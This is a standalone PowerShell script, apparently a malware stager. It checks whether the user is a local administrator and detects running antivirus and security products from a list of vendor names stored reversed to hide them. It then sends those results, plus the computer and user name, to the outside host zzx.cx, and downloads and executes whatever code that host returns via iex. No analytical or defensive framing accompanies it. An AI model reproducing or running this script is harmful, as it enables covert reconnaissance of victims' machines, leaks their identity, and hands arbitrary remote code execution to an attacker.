$ads = ""
try {
    $adm = ((New-Object System.Security.Principal.SecurityIdentifier('S-1-5-32-544')).Translate([System.Security.Principal.NTAccount])).Value.Split('\')[-1]
    $go = net localgroup $adm 2>&1
    $m = $go -split "`r`n" |
         Select-String '^-----' -Context 0,1000 |
         ForEach-Object { $_.Context.PostContext } |
         ForEach-Object { $_.Trim() } |
         Where-Object { $_ -and ($_ -notmatch '命令成功完成|The command completed successfully') }

    if ($m -contains $Env:UserName) {
        $ads = "TRUE"
    }
    else {
        $ads = "FALSE"
    }
}
catch {
    $ads = "CANT_CHECK_USER"
    $em = "Error checking admin group: $($_.Exception.Message)"
    iex -Uri "https://zzx.cx/report1.php?error=$([uri]::EscapeDataString($em))" -ErrorAction SilentlyContinue
}
function rev {
    param([string]$inp)
    $char = $inp.ToCharArray()
    [array]::Reverse($char)
    return -join $char
}
$Basee = @(
    'renoZ','tnioP kcehC yb mralAenoZ','aylliZ','xednaY','rednefeD swodniW','toorbeW','toorbeW','ygolonhceT wasraW','TIriV'    
,'toboRiV','ERPIV','23ABV','llaCesuoH-orciMdnerT','orciMdnerT','xillerT','enimparT','tnecneT','SIRTHET'    
,'NOYHCAT','cetnamyS','sohpoS','enOlenitneS','egAeruceS','oreZ enignE rofgnaS','erawypSitnAREPUS','gnisiR'    
,'laeHkciuQ','adnaP','skrowteN otlA olaP','wolfteN','notroN','surivitnA-ONAN','noitidE-WG-eefAcM','eefAcM'    
,'eruceSxaM','setyberawlaM','XAM','cinoiL','tfosgniK','suriv-itnA yksrepsaK','WG7K','suriVitnA7K'    
,'nimgnaiJ','surakI','tfosnidirG','elgooG','ataDG','ATAD G','tenitroF','eruceS-F','tfosismE','citsalE','nacSe'    
,'tniopdnE MSE','23DON-TESE','beWrD','ABP lleD','neryC','tenyC','ecnalyC','nosaerebyC','noclaF ekirtSdworC'    
,'odomoC','VAmalC','CMC','orP vakB','atehTrednefeDtiB','rednefeDtiB','udiaB','arivA','tsavA'    
,'tibacrA','LVA-yitnA','ababilA','3V-baLnhA','erawA-dA','sinorcA','surivitnA GVA','caYLA','063'
)
$found = @()
foreach ($obs in $Basee) {
    $avs = rev $obs
    try {
        $services = Get-Service -DisplayName "$avs*" -ErrorAction SilentlyContinue | Where-Object { $_.Status -eq 'Running' }
        foreach ($svc in $services) {
            if ($svc.DisplayName) {
                $found += $svc.DisplayName
            }
        }
    }
    catch {
        $em = "Error checking '$avs': $($_.Exception.Message)"
        iex -Uri "https://zzx.cx/report1.php?error=$([uri]::EscapeDataString($em))" -ErrorAction SilentlyContinue
    }
}
if ($found.Count -eq 0) {
    $found = @("ZERO_FOUND")
}
$avsRep = [string]::Join(", ", $found)
$whoami = "$env:COMPUTERNAME\$env:USERNAME"
try {
    $uri = "https://zzx.cx/report1.php?r=$([uri]::EscapeDataString($avsRep))&u=$([uri]::EscapeDataString($ads))&who=$([uri]::EscapeDataString($whoami))"
    $response = irm -Uri $uri -ErrorAction Stop
    Start-Sleep -Seconds 2
    iex $response
}
catch {
    $em = "Error executing redirection: $($_.Exception.Message)"
    iex -Uri "https://zzx.cx/report1.php?error=$([uri]::EscapeDataString($em))" -ErrorAction SilentlyContinue
}


